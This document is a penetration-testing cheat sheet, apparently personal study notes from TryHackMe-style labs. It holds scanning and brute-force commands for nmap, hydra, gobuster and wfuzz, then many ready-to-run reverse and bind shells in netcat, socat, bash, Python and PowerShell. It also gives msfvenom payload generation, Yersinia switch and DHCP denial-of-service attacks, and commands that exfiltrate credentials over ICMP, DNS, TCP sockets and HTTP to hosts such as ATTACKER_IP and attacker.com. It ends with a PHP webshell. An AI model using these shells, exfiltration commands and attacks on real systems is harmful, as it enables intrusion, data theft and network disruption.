# ====
# NMAP
# ====

# NMAP BASICS
nmap [target] # Scan a single target
nmap [target1, target2, etc] # Scan Multiple Targets
nmap -O --osscan-guess [target] # Attempt to Guess an Unknown OS
nmap -sV [target] # Service Version Detection
nmap -sV --script=banner $ip # Banner Grabbing

# Nmap: More Complex
nmap -sC -sV -oN normal.txt target-ip # Enumerate services and use default scripts
nmap -p- -oN all_ports.txt target-ip # Scan all tcp ports
nmap -p- -sU -oN all_udp_ports.txt target-ip # Scan all udp ports
ls -lh /usr/share/nmap/scripts/ # List all nse scripts
nmap --proxies socks4://proxy-ip:1080 target-ip # Nmap through socks4 proxy
nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv # Ftp bounce scan
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> # Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> # Nmap fast scan for all the ports
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP> # # Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP> # # Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV -sC -n -F -T4 <IP> # # Nmap check if any of the 100 most common UDP services is running and launch defaults scripts

# =====
# Nikto
# =====
nikto -h $ip:8000
nikto -h https://$ip:9007 -ssl -C all

# ======
# wpscan
# ======
wpscan --url <your url here> --enumerate u

# =======
# OpenSSL
# =======
openssl s_client -connect <IP_address>:443 # Check SSL Certificate

# ======
# netcat
# ======

nc -lvnp 567 # netcat listening on tcp port 567
nc 1.2.3.4 5676 # Connecting to that port from another machine
nc -lvp 8080 > /tmp/creds.data # Recieve data on port 8080 and pipe it to creds.data
nc <LOCAL-IP> <PORT> -e /bin/bash # Execute on target machine to connect back to revhsell
nc -lvnp <port> -e "cmd.exe" # Bind shell on target
nc MACHINE_IP <port> # Once opened up, connect on that port
sudo rlwrap nc -lvnp 443
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f # Creating a bind shell listener
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f # Send a netcat reverse shell

# =====
# socat
# =====
socat TCP-L:<port> - # Revshell Listener
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes # Execute on windows target to connect back to revshell (The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.)
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" # Execute on Linux target to connect back to revshell
socat TCP-L:<PORT> EXEC:"bash -li" # Execute on Linux target for bind shell
socat TCP-L:<PORT> EXEC:powershell.exe,pipes # Executre Windows target for bind shell
socat TCP:<TARGET-IP>:<TARGET-PORT> - # Connect on port opened up with bind shell

# Trying to get a fully stable revshell on Linux with Socat
socat TCP-L:<port> FILE:`tty`,raw,echo=0 # Listener
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # Connect back to listener

# Socat Encrypted RevShell
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt # Generate certificate 
cat shell.key shell.crt > shell.pem # Merge the key and certicate into a .pem file
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - # Setup an OpenSSL Listener. NOTE: verify=0 tells the connection to not bother validating the certificate. The certificate must be used on whichever device is listening.
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash # Connect back to listener

# Socat Encrypted Bind Shell
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes # Open a listener on the target
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - # Connect to that listener from your machine


# =====
# Hydra
# =====
hydra -l name -P rockyou.txt ftp://<target>:21 -v

# ====
# tmux
# ====
tmux # Starting tmux
Ctrl+b, d # Detach from a tmux session
tmux attach-session -t session_name # Attach to a tmux session
tmux ls # List tmux sessions
tmux new-session -s session_name # Create a new session

# =========
# Bettercap
# =========
syn.scan 192.168.1.0/24 1 10000 # Ports 1-10000

# ==========
# Metasploit
# ==========
msfvenom -p <PAYLOAD> <OPTIONS> # Standard syntax for msfvenom commands
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> # Generate a Windows x64 Reverse Shell in a .exe format
<OS>/<arch>/<payload>, Examples: linux/x86/shell_reverse_tcp, windows/shell_reverse_tcp, shell/reverse_tcp # Staged Payloads are denoted by '/' while stageless are denoted by '_'
use multi/handler # Multi/Handler is a superb tool for catching reverse shells
exploit -j # Tells metasploit to exploit as a background job

# ========
# Gobuster
# ========
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 3 # Bruteforce webdirectories and files by extention

# =====
# Wfuzz
# =====
wfuzz -u http://target-ip/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt # Bruteforce web parameter
wfuzz -u http://target-ip/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt # Brute force POST login

# ====
# ffuf
# ====
ffuf -w /path/to/wordlist -u https://target/FUZZ # Brute force web directories

# =============
# Random Server
# =============
curl -I <URL> | grep Server # Server HTTP Header
nc <IP> 22 # Grab SSH Header
nmap -sV -p <port_number> <hostname or IP address>

# ==============
# Reverse Shells
# ==============
bash -c 'sh -i >& /dev/tcp/<Attackers-IP>/<Listening-Port> 0>&1' # RevShell with Bash (Newer Linux Distros)
# Python RevShell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
export TERM=xterm # Gain terminal commands such as "clear" etc...
stty raw -echo; fg # Turns off terminal echo and allows ctrl+c for killing processes

# =======
# davtest
# =======
davtest -url http://target-ip/ -sendbd auto # Tries to upload (executable) files to webdav

# ========
# Yersinia
# ========
apt-get install yersinia #Installation
sudo apt install kali-linux-large # Another way to install it in Kali
yersinia -I # Interactive mode
yersinia -G # For graphic mode
# STP BPDU DoS
yersinia stp -attack 2
yersinia stp -attack 3
# STP TCP Attack
yersinia stp -attack 1 # Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 # Will send 1 CONF packet, nothing else will happen
# STP Root Attack
yersinia stp -attack 4 # Behaves like the root switch
yersinia stp -attack 5 # This will make the device behaves as a switch but will not be root
# Inducing CDP Table Flooding
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# CDP Impersonation Attack
sudo yersinia cdp -attack 2 # Simulate a new CISCO device
sudo yersinia cdp -attack 0 # Send a CDP packet
# DHCP DoS (RELEASE Packets)
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed

# =====
# nping
# =====
sudo nping --icmp -c 1 ATTACKER_IP --data-string "BOFfile.txt" # ICMP Data Exfiltration: Sending the Trigger Value from the Victim
sudo nping --icmp -c 1 ATTACKER_IP --data-string "admin:password" # ICMP Data Exfiltration: Exfiltrating sensitive data from victim
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF" # ICMP Data Exfiltration: Sending the End of File trigger Value from the Victim
sudo nping --icmp -c 1 10.10.27.8 --data-string "admin:password" # 

# =======
# tcpdump
# =======
sudo tcpdump -i eth0 udp port 53 -v  # Capturing DNS Requests


# ========
# icmpdoor
# ========
sudo icmpdoor -i eth0 -d 192.168.0.133 # Run the icmpdoor command
sudo icmp-cnc -i eth1 -d 192.168.0.121 # Establish C2 to the victim host

# ==========
# Metasploit
# ==========
set INTERFACE eth0 # Setting interface in MSF
use auxiliary/server/icmp_exfil # ICMP exfiltration

IyEvYmluL2Jhc2ggCnBpbmcgLWMgMSB0ZXN0LnRobS5jb20K


# Random
# Tar creates an Archive. z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file. Then pipe/convert to base64
# Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
tar zcf - creds/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 # TCP Socket Exfiltration from Victim
dd conv=ascii if=creds.data |base64 -d > creds.tar # Covert to ascii, then decode the base64
tar xvf creds.tar # We used the tar command to unarchive the file with the xvf arguments. The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -" # SSH Exfiltration
# We used the curl command with --data argument to send a POST request via the file parameter. Note that we created an archived file of the secret folder using the tar command. We also converted the output of the tar command into base64 representation.
curl --data "file=$(tar zcf - datafile | base64)" http://attacker.com/datahandler.py # Sending POST data via CURL
sudo sed -i 's/ /+/g' /tmp/http.bs64 # Fixing base64 url encoding while exfiltrating
echo "user1:admin" | xxd -p # Using the xxd command to convert text to Hex
ping 10.10.154.3 -c 1 -p 74686d3a7472796861636b6d650a # Send Hex using the ping command
cat sensitive_data.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' # Splitting Sensitive data across DNS Names for DNS Exfiltration
cat sensitive_data.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
# Cleaning and restoring Exfiltrated DNS Data
echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
nmap -p 80 --script http-headers $ip # Banner Grabbing
responder -I ens5 # Responder to create an SMB listener
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"# Powershell RevShell One-Liner
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> # Example Simple PHP Webshell












